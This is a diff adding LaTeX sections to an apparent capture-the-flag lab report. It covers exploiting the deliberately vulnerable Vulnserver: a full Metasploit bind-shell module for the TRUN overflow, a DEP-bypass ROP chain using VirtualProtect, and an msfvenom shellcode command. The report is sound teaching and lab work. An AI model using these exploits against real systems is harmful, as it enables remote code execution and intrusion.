+\noindent The correct seed was \texttt{1761346412} (a timestamp on 2025-10-24), which regenerated the key and decrypted the flag.
+
+\begin{itemize}[leftmargin=1.5em]
+    \item \textbf{Flag}
+\end{itemize}
+\begin{quote}
+\textbf{NTNU\{NEVER\_SEED\_YOUR\_KEYS\_WITH\_THE\_CLOCK\}}
+\end{quote}
+
+\subsection{Patch-The-Box}
+
+\begin{itemize}[leftmargin=1.5em]
+    \item \textbf{Status}
+\end{itemize}
+\noindent \textbf{Not attempted.} This challenge (Vulnerability Assessment, 100 points) was not attempted.
+
+\subsection{Exploit Developer 1}
+
+\begin{itemize}[leftmargin=1.5em]
+    \item \textbf{Description}
+\end{itemize}
+\noindent This task required developing and implementing a functional Metasploit module that exploits a vulnerable Windows application (\emph{Vulnserver}) and establishes a \textbf{bind shell} on the victim machine. The work covered setting up the lab, analysing the application, identifying the vulnerability, developing the Metasploit module, and obtaining the shell.
+
+\begin{itemize}[leftmargin=1.5em]
+    \item \textbf{Laboratory Setup}
+\end{itemize}
+\noindent The lab consisted of two virtual machines on the same virtual network so the attacker could reach the victim:
+\begin{itemize}[leftmargin=2.2em]
+    \item \textbf{Victim / development machine:} Windows 11, running \texttt{vulnserver.exe} (with \texttt{essfunc.dll} in the same folder) listening on TCP port 9999, and the \textbf{Immunity Debugger} with the \textbf{mona.py} plugin for analysis. Windows Defender and the Windows Firewall were disabled so the shellcode would not be quarantined and the ports would be reachable.
+    \item \textbf{Attacker machine:} Kali Linux, with Metasploit.
+\end{itemize}
+\noindent The victim was assigned \texttt{192.168.122.158} and Kali \texttt{192.168.122.157}. Reachability was verified with \texttt{nmap -p 9999 192.168.122.158} (port open).
+
+\begin{itemize}[leftmargin=1.5em]
+    \item \textbf{Vulnerability Analysis}
+\end{itemize}
+\noindent Connecting to the service (\texttt{HELP}) listed its commands. The \texttt{TRUN} command is vulnerable to a classic \textbf{stack-based buffer overflow}: a long argument overflows a fixed-size stack buffer and overwrites the saved return address (EIP), allowing control of execution flow.
+
+\noindent \textbf{Finding the EIP offset.} A 3000-byte cyclic (De Bruijn) pattern was sent as the \texttt{TRUN} argument, crashing the service. In Immunity, \texttt{!mona findmsp} located the pattern in memory and reported that EIP is overwritten at \textbf{offset 2004}, with ESP pointing into the attacker-controlled buffer shortly after:
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.9\linewidth]{media/exd1_findmsp.png}
+    \caption{\texttt{!mona findmsp} reporting EIP control at offset 2004 and ESP in the buffer}
+    \label{fig:exd1-findmsp}
+\end{figure}
+
+\noindent The offset was confirmed by sending \texttt{A}$\times$2004 + \texttt{BBBB} + \texttt{C}$\times$992. EIP became exactly \texttt{42424242} (the four B's) and ESP pointed to a block of \texttt{43 43 43 43} (the C's), proving precise control of EIP and that shellcode placed after the return address lands at ESP:
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.75\linewidth]{media/exd1_eip_control.png}
+    \caption{EIP overwritten with \texttt{42424242}; EBP = \texttt{41414141}, ESP points at the C's}
+    \label{fig:exd1-eip}
+\end{figure}
+
+\noindent \textbf{Bad characters.} A reference byte array of \texttt{\textbackslash x01}--\texttt{\textbackslash xff} (excluding the null byte) was generated with \texttt{!mona bytearray -b "\textbackslash x00"} and sent at ESP. Comparing the memory against the reference with \texttt{!mona compare} returned ``unmodified'', so the \textbf{only bad character is \texttt{\textbackslash x00}}:
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.85\linewidth]{media/exd1_badchars.png}
+    \caption{\texttt{!mona compare} result: no bad characters besides \texttt{\textbackslash x00}}
+    \label{fig:exd1-badchars}
+\end{figure}
+
+\noindent \textbf{Finding a redirection gadget.} To reliably jump into the shellcode at ESP, a \texttt{JMP ESP} instruction was located with \texttt{!mona jmp -r esp -m essfunc.dll}. The module \texttt{essfunc.dll} was chosen because it has \textbf{no ASLR, no rebase and no SafeSEH}, so its addresses are stable on every run. The address \textbf{\texttt{0x625012F0}} was selected (its bytes contain no \texttt{\textbackslash x00}):
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.95\linewidth]{media/exd1_jmpesp.png}
+    \caption{\texttt{!mona jmp -r esp -m essfunc.dll}: JMP ESP gadgets in a non-ASLR/SafeSEH module}
+    \label{fig:exd1-jmpesp}
+\end{figure}
+
+\begin{itemize}[leftmargin=1.5em]
+    \item \textbf{Exploit Development (Metasploit module)}
+\end{itemize}
+\noindent The analysis gives the exploit structure: \texttt{2004} filler bytes, the \texttt{JMP ESP} address (\texttt{0x625012F0}) over EIP, a short NOP sled, then the bind-shell shellcode. This was implemented as a Metasploit module, placed in \texttt{\textasciitilde/.msf4/modules/exploits/windows/misc/vulnserver\_trun.rb} on Kali:
+
+\begin{footnotesize}
+\begin{verbatim}
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = NormalRanking
+  include Msf::Exploit::Remote::Tcp
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'       => 'Vulnserver TRUN Buffer Overflow (Bind Shell)',
+      'Platform'   => 'win',
+      'Arch'       => ARCH_X86,
+      'Payload'    => { 'Space' => 500, 'BadChars' => "\x00",
+                        'DisableNops' => true },
+      'Targets'    => [
+        [ 'Windows 11 - Vulnserver / essfunc.dll',
+          { 'Ret' => 0x625012f0, 'Offset' => 2004 } ]
+      ],
+      'DefaultTarget' => 0))
+    register_options([ Opt::RPORT(9999) ])
+  end
+
+  def exploit
+    connect
+    banner = sock.get_once
+    print_status("Banner: #{banner.to_s.strip}") if banner
+
+    buffer  = "TRUN /.:/"                        # vulnerable command
+    buffer << rand_text_alpha(target['Offset'])  # 2004 bytes to EIP
+    buffer << [target.ret].pack('V')             # EIP -> JMP ESP
+    buffer << make_nops(16)                       # NOP sled
+    buffer << payload.encoded                      # bind shell
+    buffer << "\r\n"
+
+    print_status("Sending overflow (offset=#{target['Offset']}, " \
+                 "ret=0x#{target.ret.to_s(16)})")
+    sock.put(buffer)
+    handler        # connect to the bind payload on the victim
+    disconnect
+  end
+end
+\end{verbatim}
+\end{footnotesize}
+
+\noindent \textbf{Use of AI:} I got help from an AI assistant (Claude) to drive the fuzzing/analysis steps and to write the Metasploit module.
+
+\begin{itemize}[leftmargin=1.5em]
+    \item \textbf{Exploitation}
+\end{itemize}
+\noindent The module was run from Kali with a bind-shell payload:
+
+\begin{footnotesize}
+\begin{verbatim}
+use exploit/windows/misc/vulnserver_trun
+set RHOSTS 192.168.122.158
+set payload windows/shell_bind_tcp
+set LPORT 4444
+exploit
+\end{verbatim}
+\end{footnotesize}
+
+\noindent With \texttt{windows/shell\_bind\_tcp} the victim \emph{listens} on port 4444 and Metasploit connects to it --- a bind shell, as required. A command shell session opened, and \texttt{whoami} and \texttt{ipconfig} confirmed command execution as \texttt{etisk\textbackslash thort} on the victim (\texttt{192.168.122.158}):
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.95\linewidth]{media/exd1_shell.png}
+    \caption{Metasploit module opening a bind shell on the victim; \texttt{whoami}/\texttt{ipconfig} confirm access}
+    \label{fig:exd1-shell}
+\end{figure}
+
+\begin{itemize}[leftmargin=1.5em]
+    \item \textbf{Flag}
+\end{itemize}
+\noindent Awarded on successful completion of the exploitation:
+\begin{quote}
+\textbf{FLAG\{EXD1\}}
+\end{quote}
+
+\subsection{Exploit Developer 2}
+
+\begin{itemize}[leftmargin=1.5em]
+    \item \textbf{Description}
+\end{itemize}
+\noindent This task required porting the Exploit Developer 1 exploit so that it works against a Windows environment with \textbf{Data Execution Prevention (DEP)} enabled. A functional Python exploit was acceptable (no Metasploit module required), and either a bind or reverse shell was the goal. The lab was the same as EXD1 (Windows~11 victim with Vulnserver, Immunity + mona; Kali attacker), with DEP turned on via \texttt{bcdedit /set \{current\} nx AlwaysOn} followed by a reboot. DEP being active was confirmed with \texttt{bcdedit | findstr nx}:
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.5\linewidth]{media/exd2_dep_enabled.png}
+    \caption{DEP enabled on the victim (\texttt{nx AlwaysOn})}
+    \label{fig:exd2-dep-enabled}
+\end{figure}
+
+\begin{itemize}[leftmargin=1.5em]
+    \item \textbf{Why the EXD1 exploit fails under DEP}
+\end{itemize}
+\noindent The EXD1 exploit overwrites EIP with a \texttt{JMP ESP} and executes shellcode placed on the stack. DEP marks the stack as \textbf{non-executable}, so although the overflow and the \texttt{JMP ESP} redirect still succeed (EIP reaches the stack), the CPU faults the instant it tries to execute the stack bytes. Re-running the EXD1 payload with DEP on produced an access violation \emph{executing a stack address}, with EIP sitting in the stack (\texttt{00FAF9FC}) and EBP still holding the filler \texttt{41414141}:
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.6\linewidth]{media/exd2_dep_fail.png}
+    \caption{DEP blocks execution: EIP reached the stack (\texttt{00FAF9FC}) but faulted on execute}
+    \label{fig:exd2-depfail}
+\end{figure}
+
+\noindent The same bytes ran fine in EXD1 (DEP off) and produced a shell; only DEP prevents it. This is the limitation the exploit must overcome.
+
+\begin{itemize}[leftmargin=1.5em]
+    \item \textbf{The bypass: ROP to \texttt{VirtualProtect}}
+\end{itemize}
+\noindent DEP can be defeated with \textbf{Return-Oriented Programming (ROP)}: instead of executing shellcode directly, the saved return address is pointed at a chain of existing code fragments (``gadgets'') that call the Windows API \texttt{VirtualProtect()} to change the stack's memory protection to \texttt{PAGE\_EXECUTE\_\allowbreak READWRITE} (\texttt{0x40}). Once the stack is executable, the chain returns into the shellcode, which now runs normally.
+
+\noindent The ROP chain was generated with mona:
+
+\begin{footnotesize}
+\begin{verbatim}
+!mona rop -m *.dll -cp nonull
+\end{verbatim}
+\end{footnotesize}
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.75\linewidth]{media/exd2_mona_rop.png}
+    \caption{mona generating the ROP chain and writing \texttt{rop\_chains.txt}}
+    \label{fig:exd2-monarop}
+\end{figure}
+
+\noindent mona produced a ready \texttt{VirtualProtect} chain in \texttt{rop\_chains.txt}. It resolves \texttt{VirtualProtect} through the IAT of the non-ASLR \texttt{essfunc.dll} (\texttt{0x625070d0}) and sets up the arguments via a \texttt{PUSHAD} gadget:
+
+\begin{footnotesize}
+\begin{verbatim}
+0x76e9d78a,  # POP EDI # RETN            [ucrtbase.dll]
+0x625070d0,  # ptr to &VirtualProtect()  [IAT essfunc.dll]
+0x76e20191,  # MOV ESI,DWORD PTR DS:[EDI] ...  [ucrtbase.dll]
+0x41414141,  # filler (x4)
+0x7724474b,  # POP EBP # RETN            [msvcrt.dll]
+0x625012fd,  # & jmp esp                 [essfunc.dll]   (return -> shellcode)
+0x77278e38,  # POP EDX # RETN            [msvcrt.dll]
+0xfffffdff,  # -> 0x00000201 (dwSize)   via NEG
+0x76edfcb0,  # NEG EDX # RETN            [ucrtbase.dll]
+0x77354939,  # MOV EBX,EDX # RETN        [ntdll.dll]
+0x772856f8,  # POP EDX # RETN            [msvcrt.dll]
+0xffffffc0,  # -> 0x00000040 (PAGE_EXECUTE_READWRITE) via NEG
+0x76edfcb0,  # NEG EDX # RETN            [ucrtbase.dll]
+0x7722a505,  # POP ECX # RETN            [msvcrt.dll]
+0x62505be2,  # &Writable location        [essfunc.dll]
+0x751a5c6b,  # POP EDI # RETN            [RPCRT4.dll]
+0x7642a0a4,  # RETN (ROP NOP)            [KERNELBASE.dll]
+0x7640c19b,  # POP EAX # RETN            [KERNELBASE.dll]
+0x90909090,  # nop
+0x7646c2e3,  # PUSHAD # RETN             [KERNELBASE.dll]
+\end{verbatim}
+\end{footnotesize}
+
+\noindent \textbf{Note on ASLR.} Most gadgets come from ASLR'd system DLLs (\texttt{ucrtbase}, \texttt{msvcrt}, \texttt{ntdll}, \texttt{RPCRT4}, \texttt{KERNELBASE}); only \texttt{essfunc.dll} is fixed. Their addresses are randomised per boot, so the chain is valid for the \emph{current boot session} (it survives Vulnserver restarts within a session, but must be regenerated after a reboot). This task concerns DEP, not ASLR; defeating ASLR as well would require an information leak.
+
+\begin{itemize}[leftmargin=1.5em]
+    \item \textbf{The modified exploit}
+\end{itemize}
+\noindent The EXD1 single \texttt{JMP ESP} was replaced by the ROP chain. The structure keeps the same offset (2004); the chain overwrites EIP and runs, then execution falls through a NOP sled into the shellcode on the now-executable stack:
+
+\begin{footnotesize}
+\begin{verbatim}
+buf  = b"TRUN /.:/"
+buf += b"A" * 2004          # padding to the saved return address (EIP)
+buf += create_rop_chain()    # EIP -> ROP chain -> VirtualProtect() marks stack RWX
+buf += b"\x90" * 16          # NOP sled
+buf += shellcode             # windows/shell_bind_tcp (LPORT 4444), now executable
+\end{verbatim}
+\end{footnotesize}
+
+\noindent The shellcode was generated with:
+\begin{footnotesize}
+\begin{verbatim}
+msfvenom -p windows/shell_bind_tcp LPORT=4444 EXITFUNC=thread -b '\x00' -f python
+\end{verbatim}
+\end{footnotesize}
+
+\noindent \textbf{Use of AI:} I got help from an AI assistant (Claude) to analyse the DEP failure, assemble the ROP-based Python exploit, and debug it.
+
+\begin{itemize}[leftmargin=1.5em]
+    \item \textbf{Exploitation}
+\end{itemize}
+\noindent Running the Python exploit against the DEP-enabled victim and connecting to port 4444 produced a working bind shell --- command execution as \texttt{etisk\textbackslash thort} on Windows~11 with DEP on:
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.85\linewidth]{media/exd2_shell.png}
+    \caption{DEP-bypass exploit: the ROP chain enables the stack and the bind shell lands despite DEP}
+    \label{fig:exd2-shell}
+\end{figure}
+
+\begin{itemize}[leftmargin=1.5em]
+    \item \textbf{Flag}
+\end{itemize}
+\begin{quote}
+\textbf{FLAG\{EXD2\}}
+\end{quote}
+
+\subsection{Open-Box}
+
+\begin{itemize}[leftmargin=1.5em]
+    \item \textbf{Status}
+\end{itemize}
+\noindent \textbf{Not attempted.} This challenge (NETWORK-2, 200 points) was not attempted.
 
 \end{document}
